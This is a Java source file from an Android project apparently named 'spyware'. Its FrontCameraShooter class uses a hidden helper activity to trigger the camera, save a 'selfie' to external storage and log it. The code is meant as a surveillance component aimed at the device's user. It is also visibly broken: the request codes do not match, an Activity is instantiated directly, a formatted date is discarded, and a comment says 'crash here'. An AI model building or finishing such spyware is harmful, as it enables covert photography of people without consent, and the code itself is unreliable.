package com.example.cristianturetta.spyware;

import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Bundle;
import android.os.Environment;
import android.support.annotation.Nullable;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.util.Date;


public class FrontCameraShooter {

    private class SlaveActivity extends AppCompatActivity{

        private static final int CAMERA_REQUEST = 1888;

        @Override
        protected void onCreate(@Nullable Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
        }

        @Override
        protected void onActivityResult(int requestCode, int resultCode, Intent data) {
            if (requestCode == 0 && resultCode == RESULT_OK) {
                Date date = new Date();
                android.text.format.DateFormat.format("yyyy-MM-dd_hh:mm:ss", date);

                try{
                    Bundle extras = data.getExtras();
                    Bitmap imageBitmap = (Bitmap) extras.get("data");

                    String screenShotPath = Environment.getExternalStorageDirectory().toString() + "/" + date + ".jpg";

                    File imageFile = new File(screenShotPath);
                    FileOutputStream outputStream = new FileOutputStream(imageFile);

                    imageBitmap.compress(Bitmap.CompressFormat.JPEG, 90, outputStream);

                    outputStream.flush();
                    outputStream.close();
                    Log.d("FrontCameraShooter:", "selfie taken");


                }catch (Exception e){
                    Log.e("FrontCameraShooter", e.getLocalizedMessage());
                }
            }
        }


        public void shootPhoto(){
            Intent cameraIntent = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
            // TODO crash here
            startActivityForResult(cameraIntent, CAMERA_REQUEST);
        }
    }


    private SlaveActivity slaveActivity;

    public FrontCameraShooter(){
        slaveActivity = new SlaveActivity();
    }

    public void frontCameraShoot(){
        slaveActivity.shootPhoto();
    }

}
